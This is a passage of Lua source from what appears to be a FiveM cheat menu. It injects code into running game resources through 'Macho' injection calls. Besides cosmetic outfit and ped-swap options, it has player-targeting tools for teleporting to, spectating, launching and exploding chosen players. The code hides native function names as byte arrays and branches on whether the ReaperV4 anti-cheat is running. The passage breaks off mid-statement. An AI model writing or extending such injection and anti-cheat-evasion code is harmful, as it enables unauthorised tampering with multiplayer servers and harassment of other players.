                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },
                    }
                },
                {
                    label = "Wardrobe",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Random" }, label = "Outfit", desc = "Apply a preset outfit",
                            onSelect = function(value)
                                if value == "Random" then
                                    Injection("any", [[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        {
                            type = "scrollable",
                            label = "Freemode",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Freemode Male", "Freemode Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Michael", "Franklin", "Trevor", "Lamar", "Jimmy", "Amanda", "Tracey", "Ron", "Wade", "Dave Norton", 
                                "Steve Haines", "Devin Weston", "Floyd", "Chef", "Lester", "Chop", "Brad", 
                                "Police Officer Male", "Police Officer Female", "SWAT", "Sheriff Male", "Sheriff Female",
                                "Highway Cop", "FIB Male", "FIB Female", "Paramedic", "Firefighter", "Doctor",
                                "Construction Worker", "Pilot Male", "Pilot Female", "Business Male", "Business Female",
                                "Street Dealer", "Gang Male 1", "Gang Male 2", "Gang Female 1", "Ballas 1", "Ballas 2", "Ballas Female",
                                "Families 1", "Families 2", "Vagos 1", "Vagos 2", "Lost MC 1", "Lost MC 2", "Lost MC Female",
                                "Army Soldier", "Marine 1", "Marine 2", "Prisoner Male", "Prison Guard", "Cop Undercover",
                                "Security Guard", "Janitor", "Hobo Male", "Hobo Female", "Prostitute 1", "Prostitute 2",
                                "Beach Male", "Beach Female", "Tourist Male", "Tourist Female", "Skater", "Hipster Male", "Hipster Female",
                                "Bouncer", "Shopkeeper", "Chef", "Bartender", "Waiter", "Mechanic", "Taxi Driver", "Gardener", "Farmer",
                                "Dock Worker", "Trash Worker", "Postal Worker", "Bus Driver", "Pilot", "Air Hostess",
                                "Cop Traffic", "Cop Detective", "Agent", "Reporter", "News Cameraman",
                                "Hunter", "Hiker Male", "Hiker Female", "Golfer Male", "Golfer Female", "Tennis Player Male", "Tennis Player Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Animal Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = { 
                                "Boar", "Cat", "Chicken", "Chimp", "Cow", "Coyote", "Crow", 
                                "Deer", "Dolphin", "Fish", "Hen", "Humpback", "Husky", 
                                "Killer Whale", "Mountain Lion", "Pig", "Pigeon", "Poodle", 
                                "Pug", "Poodle", "Rabbit", "Rat", "Retriever", "Rhesus Monkey",
                                "Rottweiler", "Seagull", "Shepherd", "Stingray", "Tiger Shark", 
                                "Hammerhead Shark", "Cow", "Cat2", "Chickenhawk", "Cormorant",
                                "Coyote2", "Chimp2", "Boar2", "Deer2", "Fish2", "Husky2",
                                "Pug2", "Poodle2", "Retriever2", "Shepherd2", "Rat2", "Rabbit2",
                                "Dolphin2", "Killer Whale2", "Mountain Lion2", "Pig2", "Seagull2",
                                "Stingray2", "Tiger Shark2", "Hammerhead Shark2"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Server",
            type = "subMenu",
            categories = {
                {
                    label = "List",
                    tabs = {
                        { type = "button", label = "Select Everyone" },
                        { type = "button", label = "Un-Select Everyone" },
                        { type = "button", label = "Clear Selection" },
                        { type = "divider", label = "Nearby Players" },
                    }
                },
                {
                    label = "Safe",
                    tabs = {
                        { type = "button", label = "Teleport to Player", desc = 'This will teleport you to the selected player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "qd8", "There was an error while trying to teleport to that player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        qd8:UpdateListMenu()
                                        return
                                    end

                                    local playerPed = GetPlayerPed(player)
                                    local playerCoords = GetEntityCoords(playerPed)
                                    local playerHeading = GetEntityHeading(playerPed)

                                    SetEntityCoords(PlayerPedId(), playerCoords.x, playerCoords.y, playerCoords.z, false, false, false, false)
                                    SetEntityHeading(PlayerPedId(), playerHeading)
                                    self:Notify("success", "qd8", ("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "checkbox", label = "Spectate Player", checked = false, desc = 'This will attempt to Spectate the player',
                            onSelect = function(checked)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                self:HandleSpectateToggle(targetPlayer, checked)
                            end
                        },
                        { type = "button", label = "Copy Appearance", desc = 'Copy Players Clothing',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                    return
                                end
                                
                                local targetServerId = targetPlayers[1]
                                local ReaperV4Started = GetResourceState("ReaperV4") == 'started' 

                                if ReaperV4Started then
                                    MachoInjectThread(0, "any", "", string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]], targetServerId))
                                else
                                local function _b(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return t
                                    end
                                    local function _d(tbl)
                                        local s = ""
                                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                        return s
                                    end
                                    local function _g(n)
                                        local k = _d(n)
                                        local f = _G[k]
                                        return f
                                    end

                                    local function findClientIdByServerId(sid)
                                        local players = _g(_b("GetActivePlayers"))()
                                        for _, pid in ipairs(players) do
                                            if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                return pid
                                            end
                                        end
                                        return -1
                                    end

                                    local function CopyClothing(targetSid)
                                        local clientId = findClientIdByServerId(targetSid)
                                        if clientId == -1 then
                                            print("^1[ERROR] Client ID not found for Server ID: " .. targetSid .. "^0")
                                            return
                                        end

                                        local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                        local myPed = _g(_b("PlayerPedId"))()

                                        if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                            print("^2[qd8] Copying clothing from Server ID: " .. targetSid .. "^0")

                                            -- Copy clothing components
                                            _g(_b("SetPedComponentVariation"))(myPed, 1,  _g(_b("GetPedDrawableVariation"))(targetPed, 1),  _g(_b("GetPedTextureVariation"))(targetPed, 1),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 3,  _g(_b("GetPedDrawableVariation"))(targetPed, 3),  _g(_b("GetPedTextureVariation"))(targetPed, 3),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 4,  _g(_b("GetPedDrawableVariation"))(targetPed, 4),  _g(_b("GetPedTextureVariation"))(targetPed, 4),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 6,  _g(_b("GetPedDrawableVariation"))(targetPed, 6),  _g(_b("GetPedTextureVariation"))(targetPed, 6),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 8,  _g(_b("GetPedDrawableVariation"))(targetPed, 8),  _g(_b("GetPedTextureVariation"))(targetPed, 8),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)

                                            -- Copy props (hats, glasses, earrings)
                                            _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                            _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                            _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)

                                            print("^2[qd8] Clothing copied successfully!^0")
                                        else
                                            print("^3[WARNING] Target or local ped does not exist.^0")
                                        end
                                    end

                                    -- Execute directly
                                    CopyClothing(targetServerId)
                                end

                                self:Notify("success", "qd8", "Copied clothing!", 5000)
                            end
                        },
                        { type = "button", label = "Launch Player", desc = 'This will attempt to launch the player into the sky',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleLaunchPlayer(targetPlayers)
                                self:Notify("success", "qd8", "Attempting to TEST", 5000)                            
                            end
                        },
                    }
                },
                {
                    label = "Risky",
                    tabs = {
                        { type = "button", label = "Explode Player", desc = 'This will attempt to explode the player using a vehicle',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                    return
                                end

                                for _, sid in ipairs(targetPlayers) do
                                    local targetPlayer = sid
                                    local player = GetPlayerFromServerId(sid)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                        CPlayers[sid] = nil
                                        return
                                    else
                                        local script = [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]] .. tostring(targetPlayer) .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
